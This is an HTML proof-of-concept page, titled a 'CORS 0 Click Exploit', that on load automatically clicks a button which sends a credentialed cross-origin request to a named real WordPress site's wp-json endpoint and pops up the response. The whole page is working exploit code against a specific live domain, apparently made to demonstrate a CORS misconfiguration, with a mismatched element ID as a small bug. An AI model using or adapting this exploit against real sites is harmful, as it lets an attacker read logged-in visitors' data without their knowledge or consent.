<!DOCTYPE html>
<html>
<head>
    <script>
        function cors() {
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() { 
                if (this.readyState == 4 && this.status == 200) {
                    document.getElementById("emo").innerHTML = alert(this.responseText);
                }
            };
            xhttp.open("GET", "https://www.naarnederland.nl/wp-json", true);
            xhttp.withCredentials = true;
            xhttp.send();
        }

        // Function to automatically click the button when the page loads
        function autoClickButton() {
            document.querySelector('button[onclick="cors()"]').click();
        }
    </script>
</head>
<body onload="autoClickButton()">
    <center>
        <h2>mihad0x1</h2>
        <h2>CORS 0 Click Exploit</h2>

        <div id="demo">
            <button type="button" onclick="cors()">0 Click Exploit</button>
        </div>
    </center>
</body>
</html>
